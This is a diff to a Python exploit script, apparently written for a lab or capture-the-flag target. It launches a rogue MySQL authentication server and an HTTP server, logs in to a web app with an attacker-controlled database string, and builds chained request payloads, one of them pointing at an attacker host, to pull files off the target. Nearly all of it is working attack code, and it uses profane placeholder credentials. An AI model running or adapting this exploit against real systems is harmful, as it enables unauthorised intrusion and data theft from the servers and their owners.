@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # -*- encoding:utf-8 -*-
+import time
 
 import requests
 import subprocess
@@ -23,7 +24,8 @@ def callfakeserv():
         print("This script need ROOT privilegegs to open a http server listens on 80.")
         sys.exit(2)
     subprocess.Popen(["python3", "MySQL-Auth-Server/MySQL-Auth-Server.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-    subprocess.Popen(["python3", "onekeyhttpserver.py", "80"])
+    subprocess.Popen(["python3", "onekeyhttpserver.py", "80"],stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+
 
 def interact():
     session = requests.session()
@@ -46,34 +48,32 @@ def interact():
         req = session.post(query, data=iptdata)
         return parse_to_get(req.content, "textarea", {"name": "textarea"}, False)
 
-    try:
-        req = session.get(baseurl_index)
-        token = parse_to_get(req.content, "input", {"name": "token"}, True)
-        data = {
-            # "username": "dbuser",
-            # "password": "krypt0n1te",
-            "username": "fuckyou",
-            "password": "killyou",
-            "db": ATTACK_DBSTR,
-            "token": "{}".format(token),
-            "login": ""
-        }
+    req = session.get(baseurl_index)
+    token = parse_to_get(req.content, "input", {"name": "token"}, True)
+    data = {
+        # "username": "dbuser",
+        # "password": "krypt0n1te",
+        "username": "fuckyou",
+        "password": "sonofabitch",
+        "db": ATTACK_DBSTR,
+        "token": "{}".format(token),
+        "login": ""
+    }
 
-        getdata1 = session.post(baseurl_index, data=data)
-        getdata2 = build_payload("http://127.0.0.1/dev/index.php",data)
-        write_data_to_fd("firstpost", "w", base64.b64decode(getdata2))
-        usr_storage = "http://" + ATTACKER_HOST + "/firstpost"
-        getdata3 = build_payload(usr_storage, data)
-        write_data_to_fd("secondsend.html", "w", base64.b64decode(getdata3))
-        with open("secondsend.html", "r") as fd2:
-            pprint.pprint(fd2.read())
-    except:
-        print("Error detected!")
+    getdata1 = session.post(baseurl_index, data=data)
+    getdata2 = build_payload("http://127.0.0.1/dev/index.php", data)
+    write_data_to_fd("firstpost", "wb", base64.b64decode(getdata2))
+    usr_storage = "http://" + ATTACKER_HOST + "/firstpost"
+    getdata3 = build_payload(usr_storage, data)
+    write_data_to_fd("secondsend.html", "wb", base64.b64decode(getdata3))
+    with open("secondsend.html", "r") as fd2:
+        pprint.pprint(fd2.read())
 
 
 def main():
     if os.path.isdir("MySQL-Auth-Server") and os.path.isfile("onekeyhttpserver.py"):
         operation1 = threading.Thread(target=callfakeserv()).start()
+        time.sleep(2)
         operation2 = threading.Thread(target=interact()).start()
     else:
         print("Dependencies not exist, please clone the whole repo.")
